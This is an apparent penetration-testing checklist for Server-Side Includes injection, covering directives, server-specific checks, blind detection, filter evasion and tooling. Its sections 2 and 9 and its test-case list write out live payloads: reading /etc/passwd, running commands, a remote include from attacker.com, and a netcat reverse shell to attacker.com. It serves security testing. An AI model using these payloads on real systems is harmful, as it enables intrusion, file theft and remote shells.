# 🔍 SERVER-SIDE INCLUDES (SSI) INJECTION TESTING CHECKLIST

 ## Comprehensive SSI Injection Testing

### 1 Basic SSI Injection Vectors
    - SSI Directive Testing:
      * Include file injection: <!--#include file="-->
      * Virtual include testing: <!--#include virtual="-->
      * Command execution: <!--#exec cmd="-->
      * Echo directive manipulation: <!--#echo var="-->
      * Set variable injection: <!--#set var="-->

    - Common Injection Points:
      * User input fields with HTML output
      * File upload filename parameters
      * URL parameters reflected in pages
      * Form fields with server-side processing
      * Cookie values displayed in content

    - Basic Payload Patterns:
      * File inclusion: <!--#include file="/etc/passwd"-->
      * Command execution: <!--#exec cmd="ls -la"-->
      * Environment disclosure: <!--#echo var="DOCUMENT_ROOT"-->
      * Variable setting: <!--#set var="name" value="test"-->

### 2 SSI Directive Exploitation
    - File Inclusion Directives:
      * Local file inclusion: <!--#include file="/etc/passwd"-->
      * Directory traversal in includes: <!--#include file="../../../config.php"-->
      * Virtual path manipulation: <!--#include virtual="/cgi-bin/access.log"-->
      * Remote file inclusion: <!--#include virtual="http://attacker.com/shell.html"-->
      * Protocol handler testing: <!--#include virtual="file:///etc/passwd"-->

    - Command Execution Directives:
      * System command injection: <!--#exec cmd="whoami"-->
      * Multiple command execution: <!--#exec cmd="ls; id; pwd"-->
      * Command with arguments: <!--#exec cmd="/bin/cat /etc/passwd"-->
      * Background process creation: <!--#exec cmd="nohup nc -e /bin/bash attacker.com 4444 &"-->
      * Windows command execution: <!--#exec cmd="cmd.exe /c dir"-->

    - Information Disclosure Directives:
      * Environment variables: <!--#echo var="DOCUMENT_ROOT"-->
      * Server details: <!--#echo var="SERVER_SOFTWARE"-->
      * User information: <!--#echo var="REMOTE_USER"-->
      * Document information: <!--#echo var="DOCUMENT_NAME"-->
      * Date and time: <!--#echo var="DATE_LOCAL"-->

### 3 Advanced SSI Injection Techniques
    - Conditional SSI Injection:
      * If statement manipulation: <!--#if expr="$VARIABLE" -->
      * Conditional file inclusion
      * Expression evaluation in conditions
      * Nested conditional injection
      * Boolean expression exploitation

    - Variable Manipulation:
      * Environment variable modification
      * Custom variable creation and usage
      * Variable value exfiltration
      * Session variable manipulation
      * System variable overwriting

    - Config Directive Testing:
      * Error message configuration
      * Time format manipulation
      * File extension association
      * Size limit modification
      * Output formatting changes

### 4 File Extension and Handler Testing
    - SSI-Enabled Extensions:
      * shtml, shtm primary testing
      * stm extension verification
      * Custom configured extensions
      * Case variation testing
      * Double extension bypass

    - Content-Type Manipulation:
      * Force SSI parsing via Content-Type
      * MIME type confusion attacks
      * Charset parameter manipulation
      * Content negotiation exploitation
      * Response header injection

    - Handler Mapping Testing:
      * Web server handler configuration
      * CGI script SSI injection
      * Custom handler SSI processing
      * Proxy server SSI parsing
      * Load balancer SSI handling

### 5 Web Server-Specific Testing
    - Apache HTTP Server:
      * mod_include configuration testing
      * Options +Includes directive verification
      * XBitHack feature exploitation
      * Access control bypass techniques
      * htaccess SSI enablement testing

    - Nginx SSI Testing:
      * ssi on; directive verification
      * ssi_types configuration testing
      * Last-Modified header manipulation
      * Proxy SSI module exploitation
      * FastCGI with SSI processing

    - IIS Server Testing:
      * Server Side Include feature testing
      * stm handler mapping verification
      * ASP includes with SSI injection
      * WebDAV with SSI capabilities
      * ISAPI filter SSI processing

    - Other Web Servers:
      * Lighttpd mod_ssi testing
      * Cherokee server SSI configuration
      * Oracle iPlanet SSI capabilities
      * IBM HTTP Server SSI features

### 6 Context-Aware SSI Testing
    - HTML Context Injection:
      * Within HTML comments
      * Inside HTML tags and attributes
      * JavaScript block SSI injection
      * CSS style block manipulation
      * Meta tag content injection

    - Dynamic Content Context:
      * Template engine output testing
      * CMS content block injection
      * Forum post and comment systems
      * User profile field injection
      * Search result reflection

    - File Upload Context:
      * Filename SSI injection
      * File metadata manipulation
      * Thumbnail generation SSI
      * Document conversion processes
      * Archive extraction SSI

### 7 Blind SSI Injection Testing
    - Time-Based Detection:
      * Command execution with sleep/delay
      * Ping-based timing attacks
      * File system operation timing
      * Network request timing analysis
      * Conditional delay exploitation

    - Error-Based Detection:
      * Invalid directive error messages
      * File not found error differences
      * Permission denied error analysis
      * Syntax error information leakage
      * Configuration error disclosure

    - Output-Based Detection:
      * Indirect output through includes
      * File size variation detection
      * Content type changes
      * Header modification detection
      * Side-channel output analysis

### 8 Advanced Exploitation Techniques
    - Chained SSI Attacks:
      * Multiple directive combination
      * Sequential command execution
      * Conditional file inclusion chains
      * Variable passing between directives
      * Multi-step exploitation workflows

    - Privilege Escalation:
      * Command execution privilege testing
      * File system access level verification
      * Network access capability testing
      * User context manipulation
      * Service account exploitation

    - Persistence Mechanisms:
      * Web shell creation via SSI
      * Backdoor installation
      * Scheduled task creation
      * User account manipulation
      * Service installation

### 9 Defense Bypass Testing
    - Input Filter Evasion:
      * Case variation: <!--#EXEC cmd="id"-->
      * Whitespace obfuscation
      * Tab and newline injection
      * Comment insertion within directives
      * Multiple encoding layers

    - WAF Bypass Techniques:
      * Token fragmentation
      * Encoding variations (HTML, URL, Unicode)
      * Alternative directive syntax
      * Comment wrapping techniques
      * Protocol confusion attacks

    - Parser Differential Exploitation:
      * Browser vs server parsing differences
      * Multiple parser invocation
      * Charset encoding manipulation
      * Content sniffing exploitation
      * MIME type confusion

### 10 Application-Specific Testing
    - Content Management Systems:
      * CMS template injection points
      * Plugin/module SSI vulnerabilities
      * Administrative interface injection
      * User content processing
      * Theme/template file editing

    - E-commerce Applications:
      * Product description injection
      * User review SSI testing
      * Search functionality manipulation
      * Shopping cart content injection
      * Payment confirmation pages

    - Web Application Frameworks:
      * Template engine SSI integration
      * View component injection
      * Layout file manipulation
      * Partial view inclusion
      * Static file serving

### 11 Specialized Attack Vectors
    - Email Content Injection:
      * Email template SSI injection
      * Newsletter content manipulation
      * Notification system exploitation
      * Contact form reflection
      * Email header injection

    - PDF Generation SSI:
      * HTML-to-PDF conversion SSI
      * Report generation injection
      * Invoice template manipulation
      * Document rendering SSI
      * PDF metadata injection

    - Mobile Application Testing:
      * WebView SSI injection
      * Hybrid app content rendering
      * API response SSI processing
      * Mobile browser SSI capabilities
      * Progressive Web App SSI

#### Testing Tools and Methodologies:
    Manual Testing Tools:
    - Burp Suite with SSI scanner extensions
    - OWASP ZAP active scan rules for SSI
    - Custom SSI payload lists
    - Browser developer tools for response analysis
    - Curl for manual request testing

    Automated Testing Tools:
    - SSI injection fuzzing scripts
    - Custom Python requests with SSI payloads
    - Nuclei templates for SSI detection
    - Web vulnerability scanner SSI plugins
    - Automated payload generation tools

    Specialized Testing Tools:
    - SSI syntax validators
    - Web server configuration scanners
    - File inclusion testing frameworks
    - Command injection detection tools
    - Content security policy testers

    Test Case Examples:
    - Basic: <!--#exec cmd="whoami"-->
    - File: <!--#include file="/etc/passwd"-->
    - Echo: <!--#echo var="DOCUMENT_ROOT"-->
    - Conditional: <!--#if expr="$HTTP_USER_AGENT = /admin/" --><!--#include file="admin.html" --><!--#endif-->

    Testing Methodology:
    1. Identify SSI-enabled file extensions
    2. Test all user input reflection points
    3. Attempt basic SSI directive injection
    4. Test file inclusion capabilities
    5. Verify command execution possibilities
    6. Test blind SSI injection techniques
    7. Attempt defense bypass methods
    8. Document exploitation paths and impacts